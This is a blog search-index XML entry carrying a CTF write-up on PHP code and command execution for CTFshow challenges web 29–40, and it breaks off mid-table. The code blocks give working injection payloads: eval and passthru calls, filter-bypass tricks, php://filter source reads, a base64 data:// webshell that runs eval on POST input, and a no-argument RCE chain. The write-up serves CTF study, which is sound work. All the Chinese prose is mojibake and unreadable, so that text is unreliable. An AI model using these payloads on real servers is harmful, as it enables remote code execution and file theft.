<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHPä¸­çš„å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ</title>
      <link href="/2021/09/16/PHP%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2021/09/16/PHP%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPä¸­çš„å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ"><a href="#PHPä¸­çš„å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ" class="headerlink" title="PHPä¸­çš„å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ"></a>PHPä¸­çš„å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ</h1><p>æœ€è¿‘åœ¨å¤ä¹ ä¹‹å‰å­¦è¿‡å¾—çŸ¥è¯†ç‚¹ã€‚å› ä¸ºä¹‹å‰æ˜¯0åŸºç¡€æ¥å­¦ä¹ çš„ï¼Œæ‰€ä»¥å¾ˆå¤šä¸œè¥¿å¯èƒ½æ˜¯æ²¡æœ‰å¼„æ‡‚çš„ã€‚ç°åœ¨é‡æ–°å›é¡¾ä¸€ä¸‹å‘½ä»¤æ‰§è¡Œè¿™ä¸€å—ã€‚å­¦åˆ°äº†ä¸å°‘çš„çŸ¥è¯†ã€‚</p><h2 id="å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ</h2><p>åœ¨PHPä¸­æˆ‘ä»¬é¦–å…ˆè¦ææ¸…æ¥šä»€ä¹ˆæ˜¯ä»£ç æ‰§è¡Œï¼Œä»€ä¹ˆæ˜¯å‘½ä»¤æ‰§è¡Œã€‚</p><p>é€šä¿—ä¸€ç‚¹è®²ï¼Œä»£ç æ‰§è¡Œæ˜¯æ‰§è¡ŒPHPä»£ç ã€‚å‘½ä»¤æ‰§è¡Œæ˜¯æ‰§è¡Œlinuxç³»ç»Ÿä¸‹çš„å‘½ä»¤ã€‚</p><p>è¿™ä¸¤è€…æ˜¯æœ‰åŒºåˆ«çš„ã€‚æœ‰äº›ä»£ç åœ¨phpä¸‹çœ‹èµ·æ¥æ˜¯æœ‰é”™çš„ï¼Œä½†æ˜¯åœ¨linuxä¸‹æ˜¯æ­£ç¡®çš„ã€‚</p><p>åœ¨ä¸‹é¢çš„æ–‡ç« é‡Œé‡åˆ°äº†å†åˆ†æã€‚</p><h3 id="å¸¸è§çš„ä»£ç æ‰§è¡Œå‡½æ•°"><a href="#å¸¸è§çš„ä»£ç æ‰§è¡Œå‡½æ•°" class="headerlink" title="å¸¸è§çš„ä»£ç æ‰§è¡Œå‡½æ•°"></a>å¸¸è§çš„ä»£ç æ‰§è¡Œå‡½æ•°</h3><p>åœ¨PHPä¸­ï¼Œå…è®¸æˆ‘ä»¬è‡ªè¡Œä¼ å…¥phpä»£ç å¹¶æ‰§è¡Œã€‚ä¸€èˆ¬æˆ‘ä»¬å¸¸ç”¨çš„æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.<span class="keyword">eval</span>(<span class="variable">$string</span>)ï¼š</span><br><span class="line">    æŠŠå‚æ•°ä¸­çš„å­—ç¬¦ä¸²å½“åšphpä»£ç æ‰§è¡Œã€‚è¯¥å­—ç¬¦ä¸²å¿…é¡»æ˜¯åˆæ³•çš„ä»£ç ï¼Œä¸”å¿…é¡»ä»¥åˆ†å·ç»“å°¾ã€‚</span><br><span class="line">    è¿™é‡Œå¼ºè°ƒäº†åˆæ³•ä»£ç å’Œåˆ†å·ç»“å°¾ã€‚</span><br><span class="line">    æˆ‘ä»¬å¯ä»¥ç†è§£ä¸º<span class="keyword">eval</span>()æ‰§è¡Œäº†ä¸€ä¸ªç›¸å½“äºä¸º<span class="variable">$string</span>æ·»åŠ phpçŸ­æ ‡ç­¾çš„åŠŸèƒ½å³ <span class="meta">&lt;?php</span> <span class="variable">$string</span> </span><br><span class="line">    å½“ä¸èƒ½ä½¿ç”¨åˆ†å·æ—¶ï¼Œå¯ä»¥åˆ©ç”¨<span class="meta">?&gt;</span>æ¥ä»£æ›¿ã€‚å› ä¸ºphpè¯­æ³•ä¸­ï¼Œæœ€åä¸€å¥phpä»£ç å¯ä»¥ä¸é—­åˆã€‚</span><br><span class="line">    <span class="comment">#è¿™é‡Œéœ€è¦æ ¼å¤–æŒ‡å‡º,eval()æ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨ã€‚</span></span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="number">2</span>.assert(<span class="variable">$assertion</span>)ï¼š</span><br><span class="line">    å¦‚æœassertionæ˜¯å­—ç¬¦ä¸²,é‚£ä¹ˆå°†ä¼šè¢«assert()å½“ä½œphpä»£ç æ‰§è¡Œã€‚ä¸”å¯ä»¥ä¸ä»¥åˆ†å·ç»“å°¾ã€‚</span><br><span class="line">    <span class="comment">#åœ¨PHP7ä»¥å‰assertæ˜¯ä½œä¸ºå‡½æ•°ã€‚PHP7ä»¥åï¼Œassertä¸evalä¸€æ ·ã€‚éƒ½æ˜¯è¯­è¨€æ„é€ å™¨ã€‚è¿™ä¸ªçŸ¥è¯†ç‚¹å¯èƒ½ä¼šå‡ºç°åœ¨$_POST[1]($_POST[2])ä¸­</span></span><br><span class="line">    </span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="number">3</span>.call_user_func(<span class="variable">$func</span>,<span class="variable">$string</span>):</span><br><span class="line">è¯¥å‡½æ•°ç”¨äºå‡½æ•°è°ƒç”¨ã€‚æˆ‘ä»¬ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºè°ƒç”¨å‡½æ•°ï¼Œç¬¬äºŒä¸ªä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ã€‚ç®—ä¸ä¸Šä»£ç æ‰§è¡Œã€‚åªèƒ½è¯´æ˜¯ä¸€ä¸ªå±é™©å‡½æ•°ã€‚</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="å¸¸è§çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š"><a href="#å¸¸è§çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š" class="headerlink" title="å¸¸è§çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š"></a>å¸¸è§çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼š</h3><p>åœ¨PHPä¸­ï¼Œå…è®¸æˆ‘ä»¬æ‰§è¡Œç³»ç»Ÿç¨‹åºå‘½ä»¤ã€‚ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡½æ•°ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.system():</span><br><span class="line">æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åºå‘½ä»¤ï¼Œå¹¶ä¸”è¾“å‡ºæ‰§è¡Œç»“æœï¼Œè¿”å›æœ€åä¸€è¡Œã€‚</span><br><span class="line"><span class="comment">#è¿™é‡Œç†è§£ä¸€ä¸‹è¾“å‡ºæ‰§è¡Œç»“æœï¼Œè¿”å›æœ€åä¸€è¡Œã€‚æ˜¯æŒ‡å…ˆå°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœæ‰“å°å‡ºæ¥ï¼Œç„¶åå†å°†æœ€åä¸€è¡Œä½œä¸ºè¿”å›å€¼ã€‚</span></span><br><span class="line"><span class="comment">#å¯ä»¥ç†è§£ä¸ºå®ƒå‡½æ•°å†…éƒ¨å­˜åœ¨ä¸€ä¸ª print($result);return last-&gt;result;è¿™æ ·å­ã€‚</span></span><br><span class="line"><span class="comment">#å¦‚æœå‘½ä»¤ä¸­éœ€è¦ç”¨ç©ºæ ¼åˆ†å¼€çš„è¯ï¼Œå°±éœ€è¦å¯¹æ‰§è¡Œçš„å‘½ä»¤åŠ ä¸Šå¼•å·ã€‚</span></span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="number">2</span>.exec():</span><br><span class="line">æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åºã€‚å¹¶è¿”å›æ‰§è¡Œç»“æœæœ€åä¸€è¡Œçš„å†…å®¹ã€‚</span><br><span class="line"> <span class="comment">#è¿™é‡Œåªè¿”å›æ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œå†…å®¹ã€‚ä¸ä¼šæœ‰è¾“å‡ºæ‰“å°ã€‚</span></span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="number">3</span>.passthru():</span><br><span class="line">æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡º</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line"><span class="number">4</span>.shell_exec():è¯¥å‡½æ•°ç­‰ä»·äº ` `</span><br><span class="line">é€šè¿‡ shell ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚</span><br><span class="line"><span class="comment">#è¯¥å‡½æ•°ä¸ä¼šæ˜¾ç¤ºæ‰§è¡Œç»“æœã€‚éœ€è¦åŠ echoæ‰ä¼šæ‰“å°è¾“å‡ºç»“æœã€‚``æ˜¯shell_exec()çš„ç®€åŒ–å½¢å¼ã€‚å®é™…æ˜¯åŒä¸€ä¸ªå‡½æ•°ã€‚</span></span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h2 id="linuxä¸­ç”¨äºæ‰“å¼€æ–‡ä»¶çš„å‡½æ•°ï¼š"><a href="#linuxä¸­ç”¨äºæ‰“å¼€æ–‡ä»¶çš„å‡½æ•°ï¼š" class="headerlink" title="linuxä¸­ç”¨äºæ‰“å¼€æ–‡ä»¶çš„å‡½æ•°ï¼š"></a>linuxä¸­ç”¨äºæ‰“å¼€æ–‡ä»¶çš„å‡½æ•°ï¼š</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</span><br><span class="line">less:ä¸ more ç±»ä¼¼</span><br><span class="line">head:æŸ¥çœ‹å¤´å‡ è¡Œ</span><br><span class="line">tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º</span><br><span class="line">tail:æŸ¥çœ‹å°¾å‡ è¡Œ</span><br><span class="line">nlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</span><br><span class="line">od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹</span><br><span class="line">vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">sort:å¯ä»¥æŸ¥çœ‹</span><br><span class="line">uniq:å¯ä»¥æŸ¥çœ‹</span><br></pre></td></tr></table></figure><h2 id="æŸäº›å¸¸ç”¨çš„ç»•è¿‡å§¿åŠ¿ï¼š"><a href="#æŸäº›å¸¸ç”¨çš„ç»•è¿‡å§¿åŠ¿ï¼š" class="headerlink" title="æŸäº›å¸¸ç”¨çš„ç»•è¿‡å§¿åŠ¿ï¼š"></a>æŸäº›å¸¸ç”¨çš„ç»•è¿‡å§¿åŠ¿ï¼š</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ç©ºæ ¼çš„ç»•è¿‡ï¼š</span><br><span class="line">        <span class="number">1</span>.%<span class="number">09</span></span><br><span class="line">        <span class="number">2</span>.é‡å®šå‘ &lt;&gt;</span><br><span class="line">        <span class="number">3</span>.$&#123;IFS&#125;</span><br><span class="line">        <span class="number">4</span>.<span class="comment">/**/</span> æ³¨é‡Šç¬¦</span><br><span class="line">æŸäº›å­—ç¬¦ä¸²è¢«è¿‡æ»¤ï¼š</span><br><span class="line">        <span class="number">1</span>.cat--&gt; ca\t</span><br><span class="line">        <span class="number">2</span>.flag--&gt;fl\ag--&gt;fla<span class="string">&#x27;&#x27;</span>g</span><br><span class="line">        <span class="number">3</span>.f*--&gt;fla?????</span><br></pre></td></tr></table></figure><h2 id="CTFSHOW-å‘½ä»¤æ‰§è¡Œ"><a href="#CTFSHOW-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="CTFSHOW å‘½ä»¤æ‰§è¡Œ"></a>CTFSHOW å‘½ä»¤æ‰§è¡Œ</h2><h3 id="web-29"><a href="#web-29" class="headerlink" title="web 29:"></a>web 29:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload:?c=system(cat f*);</span></span><br></pre></td></tr></table></figure><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ã€‚è¿‡æ»¤äº†flag.ä½†æ˜¯éšä¾¿ç»•ã€‚ä¸¾ä¸ªæ —å­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åœ¨linuxç³»ç»Ÿä¸­ï¼š</span><br><span class="line">    ca\t f<span class="string">&#x27;&#x27;</span>lag.php == cat flag.php</span><br><span class="line">    ca\t f\lag.php == cat flag.php</span><br><span class="line">    æ²¡ä»€ä¹ˆå¥½è¯´çš„</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/16/vesyUhGNlfzg8Z2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210916205302694"></p><h3 id="web-30"><a href="#web-30" class="headerlink" title="web 30:"></a>web 30:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:?c=passthru(&#x27;cat f*&#x27;);</span></span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†system,ç”¨passthruä»£æ›¿ã€‚</p><h3 id="web-31-ç©ºæ ¼è¿‡æ»¤"><a href="#web-31-ç©ºæ ¼è¿‡æ»¤" class="headerlink" title="web 31:ç©ºæ ¼è¿‡æ»¤"></a>web 31:ç©ºæ ¼è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:?c=passthru(&#x27;more%09f*&#x27;);</span></span><br></pre></td></tr></table></figure><p>ç©ºæ ¼è¢«è¿‡æ»¤äº†ã€‚ä½¿ç”¨%09ä»£æ›¿ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨</p><h3 id="web-32-35-åˆ†å·è¿‡æ»¤"><a href="#web-32-35-åˆ†å·è¿‡æ»¤" class="headerlink" title="web 32-35:åˆ†å·è¿‡æ»¤"></a>web 32-35:åˆ†å·è¿‡æ»¤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:?c=include&quot;$_GET[1]&quot;?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"><span class="comment">### web 33:è¿‡æ»¤äº†å•åŒå¼•å·</span></span><br><span class="line"><span class="comment">#payload:?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"><span class="comment">### web 34ï¼šè¿‡æ»¤äº†ï¼š</span></span><br><span class="line"><span class="comment">#payload:?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"><span class="comment">### web 35:</span></span><br><span class="line"><span class="comment">#payload:?c=include$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"><span class="comment">### web 36:è¿‡æ»¤äº†æ•°å­—</span></span><br><span class="line"><span class="comment">#payload:?c=include$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><p>æœ¬é¢˜å› ä¸ºåˆ†å·è¢«è¿‡æ»¤äº†ã€‚å› æ­¤æˆ‘ä»¬é‡‡ç”¨?&gt;é—­åˆã€‚å¹¶ä¸”phpä¸­æœ‰è®¸å¤šä¸ç”¨æ‹¬å·çš„å‡½æ•°ã€‚å› æ­¤è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªincludeå¹¶ç»“åˆæ–‡ä»¶åŒ…å«çš„æ¼æ´</p><h3 id="web-37-38-æ–‡ä»¶åŒ…å«"><a href="#web-37-38-æ–‡ä»¶åŒ…å«" class="headerlink" title="web 37,38:æ–‡ä»¶åŒ…å«"></a>web 37,38:æ–‡ä»¶åŒ…å«</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:</span></span><br><span class="line">GET:?c=data:<span class="comment">//text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4=</span></span><br><span class="line">POST:<span class="number">1</span>=system(<span class="string">&quot;cat flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾çš„æ–‡ä»¶åŒ…å«æ‰§è¡ŒPHPä»£ç ã€‚å› ä¸ºè¿‡æ»¤äº†flagå› æ­¤æˆ‘ä»¬ä¸èƒ½ä½¿ç”¨filteråè®®ã€‚</p><p>é‚£ä¹ˆé‡‡ç”¨dataåè®®å†™é©¬ã€‚</p><h3 id="web-39"><a href="#web-39" class="headerlink" title="web 39:"></a>web 39:</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:?c=data://text/plain;base64,&lt;?php system(&quot;cat f*&quot;)?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåœ¨cåé¢æ·»åŠ äº†.phpä½†æ˜¯æˆ‘ä»¬çš„ä»£ç ä¸­å·²ç»é—­åˆã€‚æœ‰æ²¡æœ‰è¿™ä¸ª.phpå½±å“éƒ½ä¸å¤§</p><h3 id="web-40-æ— å‚RCE"><a href="#web-40-æ— å‚RCE" class="headerlink" title="web 40:æ— å‚RCE"></a>web 40:æ— å‚RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#payload:?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="left"></th><th></th><th></th></tr></thead><tbody><tr><td align="left">Localeconv()</td><td>è¿”å›åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„</td><td>è¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå€¼å°±æ˜¯â€.â€</td></tr><tr><td align="left">Cuurent()</td><td>è¿”å›æ•°ç»„ä¸­å½“å‰å…ƒç´ çš„å€¼</td><td></td></tr><tr><td align="left">Next()</td><td>æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ 